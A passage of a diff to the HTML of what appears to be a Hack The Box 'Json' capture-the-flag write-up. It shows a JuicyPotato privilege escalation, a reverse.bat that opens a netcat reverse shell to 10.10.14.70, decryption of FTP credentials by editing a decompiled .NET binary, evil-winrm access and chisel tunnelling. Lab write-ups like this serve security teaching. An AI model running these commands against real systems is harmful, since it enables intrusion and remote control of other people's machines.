+</span></span></code></pre></div><p>We now have the flag :)</p>
 <h3 id="juicypotato-working-syntax">JuicyPotato working Syntax</h3>
 <p>WORKING COMMAND LINE</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
 </span></span><span style="display:flex;"><span>cmd /c juicypotato.exe -t * -p c:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>working reverse.bat batch file:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-reverse.bat" data-lang="reverse.bat"><span style="display:flex;"><span>\users\userpool\music\nc64.exe -e cmd.exe 10.10.14.70 8000
+</span></span></code></pre></div><p>working reverse.bat batch file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-reverse.bat" data-lang="reverse.bat"><span style="display:flex;"><span>\users\userpool\music\nc64.exe -e cmd.exe 10.10.14.70 8000
 </span></span><span style="display:flex;"><span>c:<span style="color:#8be9fd;font-style:italic">\users\userpool\music\nc64.exe</span><span style="color:#6272a4"> -e cmd.exe 10.10.14.70 8000</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="beyond-root-exploiting-sync2ftp-to-find-the-superadmin-password">Beyond root: Exploiting Sync2Ftp to find the superadmin password</h2>
+</span></span></code></pre></div><h2 id="beyond-root-exploiting-sync2ftp-to-find-the-superadmin-password">Beyond root: Exploiting Sync2Ftp to find the superadmin password</h2>
 <p>Download the Sync2Ftp* files in ProgramFiles</p>
 <p>The configuration contains the username and password but it is encrypted
 <!-- raw HTML omitted -->
 <!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p>The exe is dotNet file, so we shoud be able to audit and change the code</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file SyncLocation.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file SyncLocation.exe
 </span></span><span style="display:flex;"><span>SyncLocation.exe: PE32 executable <span style="color:#ff79c6">(</span>GUI<span style="color:#ff79c6">)</span> Intel <span style="color:#bd93f9">80386</span> Mono/.Net assembly, <span style="color:#ff79c6">for</span> MS Windows
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>upload those file in CommandoVM to decompile with dnsSpy</p>
+</span></span></code></pre></div><p>upload those file in CommandoVM to decompile with dnsSpy</p>
 <p>We can edit and save the source code to pop-up a MessageBox</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span><span style="color:#ff79c6">[..]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span><span style="color:#ff79c6">[..]</span>
 </span></span><span style="display:flex;"><span>using System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Configuration</span><span style="color:#ff79c6">;</span>
 </span></span><span style="display:flex;"><span>using System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Windows</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Forms</span><span style="color:#ff79c6">;</span>
 </span></span><span style="display:flex;"><span>
@@ -746,44 +422,10 @@ There is a better script <a href="https://raw.githubusercontent.com/ohpe/juicy-p
 </span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">}</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">}</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>The user and password are <code>superadmin:funnyhtb</code></p>
+</span></span></code></pre></div><p>The user and password are <code>superadmin:funnyhtb</code></p>
 <p>We can now connect the ftp server. Because we are behind a NAT and a firewall,
 we have to connect in passive mode, otherwise our ftp client will send the internal and non-reachable IP address.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~$ ftp -p 10.10.10.158
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~$ ftp -p 10.10.10.158
 </span></span><span style="display:flex;"><span>Connected to 10.10.10.158.
 </span></span><span style="display:flex;"><span>220-FileZilla Server 0.9.60 beta
 </span></span><span style="display:flex;"><span>220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
@@ -811,141 +453,42 @@ we have to connect in passive mode, otherwise our ftp client will send the inter
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">221</span> Goodbye
 </span></span><span style="display:flex;"><span>ctf@6274ae97a895:~$ cat root.txt
 </span></span><span style="display:flex;"><span>3cc85d1bed2ee84af4074101b991d441
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Let&rsquo;s install evil-winrm to remote connect our windows box from linux</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-get install ruby-dev
+</span></span></code></pre></div><p>Let&rsquo;s install evil-winrm to remote connect our windows box from linux</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-get install ruby-dev
 </span></span><span style="display:flex;"><span>sudo gem install winrm winrm-fs stringio
 </span></span><span style="display:flex;"><span>git clone https://github.com/Hackplayers/evil-winrm.git
 </span></span><span style="display:flex;"><span>./evil-winrm.rb -i 10.10.10.158 -u superadmin -p funnyhtb
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="tunneling-on-windows-with-chisel">Tunneling on Windows with Chisel</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/www/json$ cat FileZilla_Server.xml | grep -i <span style="color:#f1fa8c">&#34;admin port&#34;</span>
+</span></span></code></pre></div><h2 id="tunneling-on-windows-with-chisel">Tunneling on Windows with Chisel</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/www/json$ cat FileZilla_Server.xml | grep -i <span style="color:#f1fa8c">&#34;admin port&#34;</span>
 </span></span><span style="display:flex;"><span>        &lt;Item <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Admin port&#34;</span> <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;numeric&#34;</span>&gt;14147&lt;/Item&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Download Chisel</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/jpillora/chisel
+</span></span></code></pre></div><p>Download Chisel</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/jpillora/chisel
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> chisel
 </span></span><span style="display:flex;"><span>go build
 </span></span><span style="display:flex;"><span>cp .<span style="color:#f1fa8c">\c</span>hisel.exe ../../../Desktop/share/
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>The FileZilla Server interface.exe is a windows binary so we will use our Commando VM to spawn a shell from the remote machine.
+</span></span></code></pre></div><p>The FileZilla Server interface.exe is a windows binary so we will use our Commando VM to spawn a shell from the remote machine.
 Once the Shell is obtained, we can start the chisel server on port 9000</p>
 <pre tabindex="0"><code>PS C:\Users\User\Documents\github\chisel &gt; ./chisel.exe server --host 192.168.99.104 --port 9000 --reverse
 </code></pre><p>Then we can port forward on client side:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; ./chisel client 10.10.14.149:9000 R:14147:127.0.0.1:14147
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; ./chisel client 10.10.14.149:9000 R:14147:127.0.0.1:14147
 </span></span><span style="display:flex;"><span>2020/02/19 12:20:50 client: Connecting to ws://10.10.14.149:9000
 </span></span><span style="display:flex;"><span>2020/02/19 12:20:51 client: Fingerprint 26:4c:e5:bd:cc:60:be:d2:3c:37:9a:d5:9e:b2:4d:37
 </span></span><span style="display:flex;"><span>2020/02/19 12:20:53 client: server: server: proxy#1:R:0.0.0.0:14147<span style="color:#ff79c6">=</span>&gt;127.0.0.1:14147: listen tcp4 0.0.0.0:14147: bind: Only one usage of each socket address <span style="color:#ff79c6">(</span>protocol/network address/port<span style="color:#ff79c6">)</span> is normally permitted.
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>On server side we can see as well the connection is established and the port listening on port 14147</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\s</span>hare &gt; ./chisel.exe server --host 0.0.0.0 --port <span style="color:#bd93f9">9000</span> --reverse
+</span></span></code></pre></div><p>On server side we can see as well the connection is established and the port listening on port 14147</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\s</span>hare &gt; ./chisel.exe server --host 0.0.0.0 --port <span style="color:#bd93f9">9000</span> --reverse
 </span></span><span style="display:flex;"><span>2020/02/19 05:18:20 server: Reverse tunnelling enabled
 </span></span><span style="display:flex;"><span>2020/02/19 05:18:20 server: Fingerprint 26:4c:e5:bd:cc:60:be:d2:3c:37:9a:d5:9e:b2:4d:37
 </span></span><span style="display:flex;"><span>2020/02/19 05:18:20 server: Listening on 0.0.0.0:9000...
 </span></span><span style="display:flex;"><span>2020/02/19 05:18:41 server: proxy#1:R:0.0.0.0:14147<span style="color:#ff79c6">=</span>&gt;127.0.0.1:14147: Listening
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Indeed netstat shows the port is listening</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>ocuments<span style="color:#f1fa8c">\g</span>ithub<span style="color:#f1fa8c">\c</span>hisel &gt; netstat -an | findstr <span style="color:#bd93f9">141</span>
+</span></span></code></pre></div><p>Indeed netstat shows the port is listening</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>ocuments<span style="color:#f1fa8c">\g</span>ithub<span style="color:#f1fa8c">\c</span>hisel &gt; netstat -an | findstr <span style="color:#bd93f9">141</span>
 </span></span><span style="display:flex;"><span>  TCP    0.0.0.0:14147          0.0.0.0:0              LISTENING
 </span></span><span style="display:flex;"><span>  TCP    127.0.0.1:1045         127.0.0.1:14147        ESTABLISHED
 </span></span><span style="display:flex;"><span>  TCP    127.0.0.1:14147        127.0.0.1:1045         ESTABLISHED
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We download FileZilla Server.exe with Firefox, and we connect it locally to the port 14147.
+</span></span></code></pre></div><p>We download FileZilla Server.exe with Firefox, and we connect it locally to the port 14147.
 We are now able to create a new dummy user &lsquo;dummy&rsquo; and give him write permissions on a new share folder pointing at &lsquo;C:'.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
